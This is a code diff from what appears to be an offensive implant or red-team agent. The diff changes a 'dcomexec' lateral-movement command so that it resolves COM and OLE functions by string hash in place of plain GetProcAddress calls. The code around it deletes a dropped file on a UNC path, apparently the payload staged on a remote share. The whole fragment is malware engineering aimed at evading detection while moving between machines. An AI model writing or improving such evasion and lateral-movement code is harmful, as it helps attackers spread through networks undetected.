@@ -120,23 +120,23 @@ auto declfn starburst::cmd_jump_dcomexec(
     }
 
     auto pCoInitializeEx = reinterpret_cast<fnCoInitializeEx>(
-        inst.kernel32.GetProcAddress( h_ole32,
-            symbol<char*>( const_cast<char*>( "CoInitializeEx" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ),
+            expr::hash_string( "CoInitializeEx" ) ) );
     auto pCoUninitialize = reinterpret_cast<fnCoUninitialize>(
-        inst.kernel32.GetProcAddress( h_ole32,
-            symbol<char*>( const_cast<char*>( "CoUninitialize" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ),
+            expr::hash_string( "CoUninitialize" ) ) );
     auto pCoCreateInstanceEx = reinterpret_cast<fnCoCreateInstanceEx>(
-        inst.kernel32.GetProcAddress( h_ole32,
-            symbol<char*>( const_cast<char*>( "CoCreateInstanceEx" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ),
+            expr::hash_string( "CoCreateInstanceEx" ) ) );
     auto pCoInitializeSecurity = reinterpret_cast<fnCoInitializeSecurity>(
-        inst.kernel32.GetProcAddress( h_ole32,
-            symbol<char*>( const_cast<char*>( "CoInitializeSecurity" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ),
+            expr::hash_string( "CoInitializeSecurity" ) ) );
     auto pSysAllocString = reinterpret_cast<fnSysAllocString>(
-        inst.kernel32.GetProcAddress( h_oleaut32,
-            symbol<char*>( const_cast<char*>( "SysAllocString" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ),
+            expr::hash_string( "SysAllocString" ) ) );
     auto pSysFreeString = reinterpret_cast<fnSysFreeString>(
-        inst.kernel32.GetProcAddress( h_oleaut32,
-            symbol<char*>( const_cast<char*>( "SysFreeString" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ),
+            expr::hash_string( "SysFreeString" ) ) );
 
     if ( !pCoInitializeEx || !pCoCreateInstanceEx || !pSysAllocString || !pSysFreeString ) {
         inst.kernel32.DeleteFileW( w_unc );
